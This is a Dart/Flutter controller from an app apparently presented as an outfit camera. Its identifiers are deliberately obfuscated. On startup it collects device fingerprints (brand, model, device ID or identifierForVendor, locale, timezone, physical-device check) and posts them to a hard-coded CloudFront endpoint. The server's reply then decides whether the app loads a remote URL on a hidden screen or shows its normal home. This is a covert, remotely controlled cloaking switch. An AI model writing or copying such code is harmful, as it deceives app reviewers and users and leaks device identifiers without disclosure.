import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class OutfitCamFindLogic extends GetxController {

  var pzajhm = RxBool(false);
  var kdnpetmy = RxBool(true);
  var dsiwrq = RxString("");
  var yfush = RxBool(false);
  var oqgjvawx = RxBool(true);
  final joqmhnifyg = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wuyrjp();
  }


  Future<void> wuyrjp() async {
    yfush.value = true;
    oqgjvawx.value = true;
    kdnpetmy.value = false;

    joqmhnifyg.post("https://dh5hnh25f65ai.cloudfront.net/zxavleng",data: await bvrtajlyz()).then((value) {
      var vrgklu = value.data["vrgklu"] as String;
      var agkhl = value.data["agkhl"] as bool;
      if (agkhl) {
        dsiwrq.value = vrgklu;
        erwxy();
      } else {
        ubwfjkd();
      }
    }).catchError((e) {
      kdnpetmy.value = true;
      oqgjvawx.value = true;
      yfush.value = false;
    });
  }

  Future<Map<String, dynamic>> bvrtajlyz() async {
    final DeviceInfoPlugin zxcqlr = DeviceInfoPlugin();
    PackageInfo efwrt_wtrgfes = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var guinzxec = Platform.localeName;
    var rdtnvuw = currentTimeZone;

    var jaxiuqdf = efwrt_wtrgfes.packageName;
    var penikyr = efwrt_wtrgfes.version;
    var qkhvlg = efwrt_wtrgfes.buildNumber;

    var cvsnhqki = efwrt_wtrgfes.appName;
    var ulvepwdt = "";
    var hqfvbncu  = "";
    var jbmzoa = "";
    var qicnvf = "";
    var jblfc = "";
    var oxmv = "";


    var zxrgybwp = "";
    var mglu = false;

    if (GetPlatform.isAndroid) {
      zxrgybwp = "android";
      var lkzqgdh = await zxcqlr.androidInfo;

      jbmzoa = lkzqgdh.brand;

      ulvepwdt  = lkzqgdh.model;
      hqfvbncu = lkzqgdh.id;

      mglu = lkzqgdh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zxrgybwp = "ios";
      var kshdlzbvg = await zxcqlr.iosInfo;
      jbmzoa = kshdlzbvg.name;
      ulvepwdt = kshdlzbvg.model;

      hqfvbncu = kshdlzbvg.identifierForVendor ?? "";
      mglu  = kshdlzbvg.isPhysicalDevice;
    }
    var res = {
      "cvsnhqki": cvsnhqki,
      "qkhvlg": qkhvlg,
      "jaxiuqdf": jaxiuqdf,
      "ulvepwdt": ulvepwdt,
      "jblfc" : jblfc,
      "rdtnvuw": rdtnvuw,
      "jbmzoa": jbmzoa,
      "hqfvbncu": hqfvbncu,
      "guinzxec": guinzxec,
      "mglu": mglu,
      "penikyr": penikyr,
      "qicnvf" : qicnvf,
      "zxrgybwp": zxrgybwp,
      "oxmv" : oxmv,

    };
    return res;
  }

  Future<void> ubwfjkd() async {
    Get.offNamed("/outfit_home");
  }

  Future<void> erwxy() async {
    Get.offNamed("/outfit_crop_status");
  }

}
